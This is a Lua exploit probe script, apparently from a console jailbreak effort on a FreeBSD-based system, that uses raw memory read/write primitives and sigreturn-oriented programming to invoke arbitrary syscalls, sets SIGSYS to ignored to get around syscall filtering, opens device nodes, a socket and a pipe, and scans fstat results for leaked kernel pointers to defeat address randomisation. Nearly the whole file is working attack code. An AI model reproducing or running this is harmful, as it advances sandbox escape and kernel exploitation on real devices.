-- CRASH_CLASS: LOW
-- PROBE 355a: Full fstat dump on all available fds + kernel pointer scan
--
-- 353d proved fstat(189) is present (it was SIGSYS, not absent).
-- This probe:
-- 1. Ignores SIGSYS via sigaction(12, SIG_IGN)
-- 2. Opens many device/file fds
-- 3. Calls fstat on each, dumps full 120-byte stat struct
-- 4. Scans every qword for kernel pointers
-- Also tests: fstat on socket, pipe, physhm, device nodes

print("=== PROBE 355a: FSTAT KPTR SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Step 1: Ignore SIGSYS (signal 12)
print("--- STEP 1: SIGACTION(SIGSYS, SIG_IGN) ---")
-- sigaction(sig, act, oact) = sys 416
-- struct sigaction: sa_handler at +0, sa_flags at +8, sa_mask at +16
local SIG = 0x90000
-- SIG_IGN = 1
wq(gpu + SIG, uint64(1))        -- sa_handler = SIG_IGN
wd(gpu + SIG + 8, 0)            -- sa_flags = 0
wq(gpu + SIG + 16, uint64(0))   -- sa_mask = 0
local rv = srop(416, uint64(12), ga(SIG), uint64(0))
print("sigaction(12, SIG_IGN)=" .. (rv and to_num(rv) or -999))

-- Step 2: Open various fds
print("")
print("--- STEP 2: OPEN FDS ---")
local fds = {}

-- Open device nodes
local devices = {
    "/dev/gc", "/dev/dce", "/dev/rng", "/dev/ajm",
    "/dev/dmem0", "/dev/camera", "/dev/hid", "/dev/gic",
    "/dev/null", "/dev/zero"
}
for _, dev in ipairs(devices) do
    -- Write path string to GPU buffer
    local PATH = 0xA0000
    for i = 0, #dev do
        local b = (i < #dev) and string.byte(dev, i+1) or 0
        local off = PATH + (i - i%4)
        local dw = rd(gpu + off)
        local shift = (i%4) * 8
        dw = dw - (dw % (256 ^ (i%4+1)) - dw % (256 ^ (i%4)))
        dw = dw + b * (256 ^ (i%4))
        wd(gpu + off, dw)
    end
    -- open(path, O_RDONLY) = sys 5
    rv = srop(5, ga(PATH), uint64(0))
    local fd_val = rv and to_num(rv) or -1
    if fd_val >= 0 then
        table.insert(fds, {fd=fd_val, name=dev})
        print("  " .. dev .. " fd=" .. fd_val)
    end
end

-- Create a socket
rv = srop(97, uint64(2), uint64(1), uint64(0))  -- AF_INET, SOCK_STREAM
local sock_fd = rv and to_num(rv) or -1
if sock_fd >= 0 then
    table.insert(fds, {fd=sock_fd, name="socket"})
    print("  socket fd=" .. sock_fd)
end

-- Create a pipe
rv = srop(42)
local pipe_fd = rv and to_num(rv) or -1
if pipe_fd >= 0 then
    table.insert(fds, {fd=pipe_fd, name="pipe_rd"})
    table.insert(fds, {fd=pipe_fd+1, name="pipe_wr"})
    print("  pipe rd=" .. pipe_fd .. " wr=" .. (pipe_fd+1))
end

-- Step 3: fstat on each fd
print("")
print("--- STEP 3: FSTAT SCAN ---")
local STAT_SIZE = 0x80  -- FreeBSD struct stat is ~120 bytes
local total_kptrs = 0

for _, entry in ipairs(fds) do
    -- Zero the stat buffer
    local BUF = 0xB0000
    for i = 0, STAT_SIZE - 1, 4 do wd(gpu + BUF + i, 0) end

    -- fstat(fd, buf) = sys 189
    rv = srop(189, uint64(entry.fd), ga(BUF))
    local ret = rv and to_num(rv) or -999

    if ret == 0 then
        -- Scan for kernel pointers
        local kptrs = {}
        for off = 0, STAT_SIZE - 8, 8 do
            local qv = rq(gpu + BUF + off)
            local qh, ql = get_hi_lo(qv)
            if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                table.insert(kptrs, {off=off, val=hex64(qv)})
            end
        end

        if #kptrs > 0 then
            print("  " .. entry.name .. " (fd=" .. entry.fd .. ") ret=0 *** " .. #kptrs .. " KPTR ***")
            for _, kp in ipairs(kptrs) do
                print("    +" .. string.format("%02X", kp.off) .. " = " .. kp.val)
            end
            total_kptrs = total_kptrs + #kptrs
        else
            -- Print key fields for non-kptr fds
            local dev = rq(gpu + BUF + 0)     -- st_dev
            local ino = rq(gpu + BUF + 8)     -- st_ino
            local mode = rd(gpu + BUF + 0x18) -- st_mode (approx)
            print("  " .. entry.name .. " (fd=" .. entry.fd .. ") ret=0 dev=" ..
                hex64(dev) .. " ino=" .. hex64(ino) ..
                " mode=0x" .. string.format("%X", mode % 0x10000))
        end
    else
        print("  " .. entry.name .. " (fd=" .. entry.fd .. ") ret=" .. ret)
    end
end

-- Step 4: Also try fstat on std fds (0,1,2)
print("")
print("--- STEP 4: STD FDS ---")
for fd_val = 0, 2 do
    local BUF = 0xB0000
    for i = 0, STAT_SIZE - 1, 4 do wd(gpu + BUF + i, 0) end
    rv = srop(189, uint64(fd_val), ga(BUF))
    local ret = rv and to_num(rv) or -999
    if ret == 0 then
        -- Full hex dump of first 64 bytes
        local line = "  fd=" .. fd_val .. " ret=0:"
        for off = 0, 0x3F, 8 do
            line = line .. " " .. hex64(rq(gpu + BUF + off))
        end
        print(line)
        -- Check for kptrs
        for off = 0, STAT_SIZE - 8, 8 do
            local qv = rq(gpu + BUF + off)
            local qh = get_hi_lo(qv)
            if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                print("    *** KPTR +" .. string.format("%02X", off) .. " = " .. hex64(qv))
                total_kptrs = total_kptrs + 1
            end
        end
    else
        print("  fd=" .. fd_val .. " ret=" .. ret)
    end
end

-- Cleanup
for _, entry in ipairs(fds) do
    srop(6, uint64(entry.fd))
end

print("")
print("TOTAL KERNEL POINTERS: " .. total_kptrs)
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
